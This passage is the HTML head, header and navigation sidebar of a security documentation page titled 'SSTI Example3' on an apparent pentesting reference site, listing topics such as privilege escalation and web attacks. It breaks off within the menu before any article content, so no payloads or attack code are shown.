<!doctype html><html lang=en class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="SecOps.cc is an information security platform designed to cover various offensive & defensive security topics"><meta name=author content=dh><link href=https://secops.cc/server_side_attacks/ssti_example3/ rel=canonical><link rel=icon href=../../assets/favicon.png><meta name=generator content="mkdocs-1.2.3, mkdocs-material-8.1.4"><title>SSTI Example3 - SecOps.cc</title><link rel=stylesheet href=../../assets/stylesheets/main.bb3983ee.min.css><link rel=stylesheet href=../../assets/stylesheets/palette.e6a45f82.min.css><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback"><style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style><script>__md_scope=new URL("../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script></head> <body dir=ltr data-md-color-scheme=default data-md-color-primary=indigo data-md-color-accent=indigo> <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)</script> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#python-primer-for-ssti class=md-skip> Skip to content </a> </div> <div data-md-component=announce> </div> <header class=md-header data-md-component=header> <nav class="md-header__inner md-grid" aria-label=Header> <a href=../.. title=SecOps.cc class="md-header__button md-logo" aria-label=SecOps.cc data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 89 89"> <path d=M3.136,17.387l0,42.932l42.932,21.467l-42.932,-64.399Z /> <path d=M21.91,8l42.933,64.398l-18.775,9.388l-42.932,-64.399l18.774,-9.387Z style="fill-opacity: 0.5"/> <path d=M67.535,17.387l-27.262,18.156l21.878,32.818l5.384,2.691l0,-53.665Z /> <path d=M67.535,17.387l0,53.666l18.774,-9.388l0,-53.665l-18.774,9.387Z style="fill-opacity: 0.25"/> </svg> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> SecOps.cc </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> SSTI Example3 </span> </div> </div> </div> <form class=md-header__option data-md-component=palette> <input class=md-option data-md-color-media data-md-color-scheme=default data-md-color-primary=indigo data-md-color-accent=indigo aria-label="Switch to dark mode" type=radio name=__palette id=__palette_1> <label class="md-header__button md-icon" title="Switch to dark mode" for=__palette_2 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3z"/></svg> </label> <input class=md-option data-md-color-media data-md-color-scheme=slate data-md-color-primary=red data-md-color-accent=red aria-label="Switch to light mode" type=radio name=__palette id=__palette_2> <label class="md-header__button md-icon" title="Switch to light mode" for=__palette_1 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6zm0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4zM7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg> </label> </form> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=Search placeholder=Search autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </label> <nav class=md-search__options aria-label=Search> <a href=javascript:void(0) class="md-search__icon md-icon" aria-label=Share data-clipboard data-clipboard-text data-md-component=search-share tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08z"/></svg> </a> <button type=reset class="md-search__icon md-icon" aria-label=Clear tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg> </button> </nav> <div class=md-search__suggest data-md-component=search-suggest></div> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> Initializing search </div> <ol class=md-search-result__list></ol> </div> </div> </div> </div> </div> <div class=md-header__source> <a href=https://github.com/hrmnsio/SecOps title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg> </div> <div class=md-source__repository> hrmnsio/SecOps </div> </a> </div> </nav> </header> <div class=md-container data-md-component=container> <nav class=md-tabs aria-label=Tabs data-md-component=tabs> <div class="md-tabs__inner md-grid"> <ul class=md-tabs__list> <li class=md-tabs__item> <a href=../.. class=md-tabs__link> Home </a> </li> <li class=md-tabs__item> <a href=../../changelog/ class="md-tabs__link md-tabs__link--active"> Docs </a> </li> <li class=md-tabs__item> <a href=../../blog/ class=md-tabs__link> Blog </a> </li> </ul> </div> </nav> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary md-nav--lifted" aria-label=Navigation data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../.. title=SecOps.cc class="md-nav__button md-logo" aria-label=SecOps.cc data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 89 89"> <path d=M3.136,17.387l0,42.932l42.932,21.467l-42.932,-64.399Z /> <path d=M21.91,8l42.933,64.398l-18.775,9.388l-42.932,-64.399l18.774,-9.387Z style="fill-opacity: 0.5"/> <path d=M67.535,17.387l-27.262,18.156l21.878,32.818l5.384,2.691l0,-53.665Z /> <path d=M67.535,17.387l0,53.666l18.774,-9.388l0,-53.665l-18.774,9.387Z style="fill-opacity: 0.25"/> </svg> </a> SecOps.cc </label> <div class=md-nav__source> <a href=https://github.com/hrmnsio/SecOps title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg> </div> <div class=md-source__repository> hrmnsio/SecOps </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../.. class=md-nav__link> Home </a> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2 type=checkbox id=__nav_2 checked> <div class="md-nav__link md-nav__link--index "> <a href=../../changelog/ >Docs</a> <label for=__nav_2> <span class="md-nav__icon md-icon"></span> </label> </div> <nav class=md-nav aria-label=Docs data-md-level=1> <label class=md-nav__title for=__nav_2> <span class="md-nav__icon md-icon"></span> Docs </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_2 type=checkbox id=__nav_2_2> <label class=md-nav__link for=__nav_2_2> Cheatsheets <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Cheatsheets data-md-level=2> <label class=md-nav__title for=__nav_2_2> <span class="md-nav__icon md-icon"></span> Cheatsheets </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_2_1 type=checkbox id=__nav_2_2_1> <label class=md-nav__link for=__nav_2_2_1> Pentesting/CTF <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Pentesting/CTF data-md-level=3> <label class=md-nav__title for=__nav_2_2_1> <span class="md-nav__icon md-icon"></span> Pentesting/CTF </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../cheat_sheets/cheatsheet-77/ class=md-nav__link> Commands </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/linux_shortcuts/ class=md-nav__link> Linux Shortcuts </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/windows/ class=md-nav__link> Windows </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/shells_payloads/ class=md-nav__link> Shells & Payloads </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/web_requests/ class=md-nav__link> Web requests </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/deobfuscation/ class=md-nav__link> (De)Obfuscation </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/brute_forcing/ class=md-nav__link> Brute Forcing </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/common_apps/ class=md-nav__link> Common Applications </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/web_attacks/ class=md-nav__link> Web Attacks </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/file_transfer/ class=md-nav__link> File Transfer </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/win_privesc/ class=md-nav__link> Windows Privilege Escalation </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/footprinting/ class=md-nav__link> Footprinting </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3 type=checkbox id=__nav_2_3 checked> <label class=md-nav__link for=__nav_2_3> Red Team <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Red Team" data-md-level=2> <label class=md-nav__title for=__nav_2_3> <span class="md-nav__icon md-icon"></span> Red Team </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_1 type=checkbox id=__nav_2_3_1> <label class=md-nav__link for=__nav_2_3_1> Footprinting <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Footprinting data-md-level=3> <label class=md-nav__title for=__nav_2_3_1> <span class="md-nav__icon md-icon"></span> Footprinting </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../footprinting/domain_information/ class=md-nav__link> Domain Information </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_1_2 type=checkbox id=__nav_2_3_1_2> <label class=md-nav__link for=__nav_2_3_1_2> Host Based Enumeration <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Host Based Enumeration" data-md-level=4> <label class=md-nav__title for=__nav_2_3_1_2> <span class="md-nav__icon md-icon"></span> Host Based Enumeration </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../footprinting/ftp/ class=md-nav__link> FTP </a> </li> <li class=md-nav__item> <a href=../../footprinting/smb/ class=md-nav__link> SMB </a> </li> <li class=md-nav__item> <a href=../../footprinting/nfs/ class=md-nav__link> NFS </a> </li> <li class=md-nav__item> <a href=../../footprinting/dns/ class=md-nav__link> DNS </a> </li> <li class=md-nav__item> <a href=../../footprinting/smtp/ class=md-nav__link> SMTP </a> </li> <li class=md-nav__item> <a href=../../footprinting/imap_pop3/ class=md-nav__link> IMAP/POP3 </a> </li> <li class=md-nav__item> <a href=../../footprinting/snmp/ class=md-nav__link> SNMP </a> </li> <li class=md-nav__item> <a href=../../footprinting/mysql/ class=md-nav__link> MySQL </a> </li> <li class=md-nav__item> <a href=../../footprinting/mssql/ class=md-nav__link> MSSQL </a> </li> <li class=md-nav__item> <a href=../../footprinting/ipmi/ class=md-nav__link> IPMI </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_1_3 type=checkbox id=__nav_2_3_1_3> <label class=md-nav__link for=__nav_2_3_1_3> Remote Management Protocols <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Remote Management Protocols" data-md-level=4> <label class=md-nav__title for=__nav_2_3_1_3> <span class="md-nav__icon md-icon"></span> Remote Management Protocols </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../footprinting/linux_remote_management_protocol/ class=md-nav__link> Linux </a> </li> <li class=md-nav__item> <a href=../../footprinting/windows_remote_management_protocol/ class=md-nav__link> Windows </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_2 type=checkbox id=__nav_2_3_2> <label class=md-nav__link for=__nav_2_3_2> OS Basics <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="OS Basics" data-md-level=3> <label class=md-nav__title for=__nav_2_3_2> <span class="md-nav__icon md-icon"></span> OS Basics </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_2_1 type=checkbox id=__nav_2_3_2_1> <label class=md-nav__link for=__nav_2_3_2_1> Basics Linux <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Basics Linux" data-md-level=4> <label class=md-nav__title for=__nav_2_3_2_1> <span class="md-nav__icon md-icon"></span> Basics Linux </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../basics_linux/linux/ class=md-nav__link> Linux </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_2_2 type=checkbox id=__nav_2_3_2_2> <label class=md-nav__link for=__nav_2_3_2_2> Basics Windows <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Basics Windows" data-md-level=4> <label class=md-nav__title for=__nav_2_3_2_2> <span class="md-nav__icon md-icon"></span> Basics Windows </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../basics_windows/windows/ class=md-nav__link> Windows </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_3 type=checkbox id=__nav_2_3_3> <label class=md-nav__link for=__nav_2_3_3> Privilege Escalation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Privilege Escalation" data-md-level=3> <label class=md-nav__title for=__nav_2_3_3> <span class="md-nav__icon md-icon"></span> Privilege Escalation </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_3_1 type=checkbox id=__nav_2_3_3_1> <label class=md-nav__link for=__nav_2_3_3_1> Windows PrivEsc <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Windows PrivEsc" data-md-level=4> <label class=md-nav__title for=__nav_2_3_3_1> <span class="md-nav__icon md-icon"></span> Windows PrivEsc </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/tools/ class=md-nav__link> Useful Tools </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_3_1_2 type=checkbox id=__nav_2_3_3_1_2> <label class=md-nav__link for=__nav_2_3_3_1_2> Getting the Lay of the Land <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Getting the Lay of the Land" data-md-level=5> <label class=md-nav__title for=__nav_2_3_3_1_2> <span class="md-nav__icon md-icon"></span> Getting the Lay of the Land </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/gtlotl/ class=md-nav__link> Situational Awareness </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/init_enum/ class=md-nav__link> Initial Enumeration </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/comm_with_ps/ class=md-nav__link> Communication with Processes </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_3_1_3 type=checkbox id=__nav_2_3_3_1_3> <label class=md-nav__link for=__nav_2_3_3_1_3> Windows User Privileges <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Windows User Privileges" data-md-level=5> <label class=md-nav__title for=__nav_2_3_3_1_3> <span class="md-nav__icon md-icon"></span> Windows User Privileges </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/seimpersonate_seassignprimarytoken/ class=md-nav__link> SeImpersonate and SeAssignPrimaryToken </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/sebugpriv/ class=md-nav__link> SeDebugPrivilege </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/setakeownershippriv/ class=md-nav__link> SeTakeOwnershipPrivilege </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_3_1_4 type=checkbox id=__nav_2_3_3_1_4> <label class=md-nav__link for=__nav_2_3_3_1_4> Windows Group Privileges <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Windows Group Privileges" data-md-level=5> <label class=md-nav__title for=__nav_2_3_3_1_4> <span class="md-nav__icon md-icon"></span> Windows Group Privileges </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/builtin_groups/ class=md-nav__link> Windows Built-in Groups </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/eventlog_readers/ class=md-nav__link> Event Log Readers </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/dnsadmins/ class=md-nav__link> DnsAdmins </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/hyperv_admins/ class=md-nav__link> Hyper-V Administrators </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/print_operators/ class=md-nav__link> Print Operators </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/server_operators/ class=md-nav__link> Server Operators </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_3_1_5 type=checkbox id=__nav_2_3_3_1_5> <label class=md-nav__link for=__nav_2_3_3_1_5> Attacking the OS <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Attacking the OS" data-md-level=5> <label class=md-nav__title for=__nav_2_3_3_1_5> <span class="md-nav__icon md-icon"></span> Attacking the OS </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/user_account_control/ class=md-nav__link> User Account Control </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/weak_permissions/ class=md-nav__link> Weak Permissions </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/kernel_exploits/ class=md-nav__link> Kernel Exploits </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/vulnerable_services/ class=md-nav__link> Vulnerable Services </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_3_1_6 type=checkbox id=__nav_2_3_3_1_6> <label class=md-nav__link for=__nav_2_3_3_1_6> Credential Theft <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Credential Theft" data-md-level=5> <label class=md-nav__title for=__nav_2_3_3_1_6> <span class="md-nav__icon md-icon"></span> Credential Theft </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/credential_hunting/ class=md-nav__link> Credential Hunting </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/other_files/ class=md-nav__link> Other Files </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/further_credential_theft/ class=md-nav__link> Further Credential Theft </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_3_1_7 type=checkbox id=__nav_2_3_3_1_7> <label class=md-nav__link for=__nav_2_3_3_1_7> Additional Techniques <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Additional Techniques" data-md-level=5> <label class=md-nav__title for=__nav_2_3_3_1_7> <span class="md-nav__icon md-icon"></span> Additional Techniques </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/interacting_with_users/ class=md-nav__link> Interacting with Users </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/miscellaneous_techniques/ class=md-nav__link> Miscellaneous Techniques </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_3_1_8 type=checkbox id=__nav_2_3_3_1_8> <label class=md-nav__link for=__nav_2_3_3_1_8> EOL Systems <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="EOL Systems" data-md-level=5> <label class=md-nav__title for=__nav_2_3_3_1_8> <span class="md-nav__icon md-icon"></span> EOL Systems </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/windows_server/ class=md-nav__link> Windows Server </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/windows_desktop/ class=md-nav__link> Windows Desktop </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_4 type=checkbox id=__nav_2_3_4> <label class=md-nav__link for=__nav_2_3_4> File Transfers <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="File Transfers" data-md-level=3> <label class=md-nav__title for=__nav_2_3_4> <span class="md-nav__icon md-icon"></span> File Transfers </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../file_transfers/methods/ class=md-nav__link> Methods </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_5 type=checkbox id=__nav_2_3_5> <label class=md-nav__link for=__nav_2_3_5> Networking <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Networking data-md-level=3> <label class=md-nav__title for=__nav_2_3_5> <span class="md-nav__icon md-icon"></span> Networking </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../networking/overview/ class=md-nav__link> Overview </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_6 type=checkbox id=__nav_2_3_6> <label class=md-nav__link for=__nav_2_3_6> Login Brute Forcing <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Login Brute Forcing" data-md-level=3> <label class=md-nav__title for=__nav_2_3_6> <span class="md-nav__icon md-icon"></span> Login Brute Forcing </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../login_brute_forcing/basic_http_auth_brute_forcing/ class=md-nav__link> Basic HTTP Auth Brute Forcing </a> </li> <li class=md-nav__item> <a href=../../login_brute_forcing/web_forms_brute_forcing/ class=md-nav__link> Web Forms Brute Forcing </a> </li> <li class=md-nav__item> <a href=../../login_brute_forcing/service_authentication/ class=md-nav__link> Service Authentication Attacks </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_7 type=checkbox id=__nav_2_3_7> <label class=md-nav__link for=__nav_2_3_7> Atk Common Applications <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Atk Common Applications" data-md-level=3> <label class=md-nav__title for=__nav_2_3_7> <span class="md-nav__icon md-icon"></span> Atk Common Applications </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../attacking_common_apps/setting_the_stage/ class=md-nav__link> Setting the Stage </a> </li> <li class=md-nav__item> <a href=../../attacking_common_apps/content_management_systems/ class=md-nav__link> Content Management Systems </a> </li> <li class=md-nav__item> <a href=../../attacking_common_apps/containers_software_dev/ class=md-nav__link> Servlet Containers/Software Development </a> </li> <li class=md-nav__item> <a href=../../attacking_common_apps/infra_network_monitoring_tools/ class=md-nav__link> Infrastructure/Network Monitoring Tools </a> </li> <li class=md-nav__item> <a href=../../attacking_common_apps/cs_config_mgmt/ class=md-nav__link> Customer Service Mgmt & Configuration Mgmt </a> </li> <li class=md-nav__item> <a href=../../attacking_common_apps/closing_out/ class=md-nav__link> Closing Out </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_8 type=checkbox id=__nav_2_3_8> <label class=md-nav__link for=__nav_2_3_8> Atk Web Applications <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Atk Web Applications" data-md-level=3> <label class=md-nav__title for=__nav_2_3_8> <span class="md-nav__icon md-icon"></span> Atk Web Applications </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../attacking_web_applications/http_verb_tampering/ class=md-nav__link> HTTP Verb Tampering </a> </li> <li class=md-nav__item> <a href=../../attacking_web_applications/idor/ class=md-nav__link> Insecure Direct Object References </a> </li> <li class=md-nav__item> <a href=../../attacking_web_applications/xxe/ class=md-nav__link> XML External Entity (XXE) Injection </a> </li> <li class=md-nav__item> <a href=../../attacking_web_applications/sql_injection/ class=md-nav__link> SQLi </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_9 type=checkbox id=__nav_2_3_9 checked> <label class=md-nav__link for=__nav_2_3_9> Server Side Atks <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Server Side Atks" data-md-level=3> <label class=md-nav__title for=__nav_2_3_9> <span class="md-nav__icon md-icon"></span> Server Side Atks </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_9_1 type=checkbox id=__nav_2_3_9_1> <label 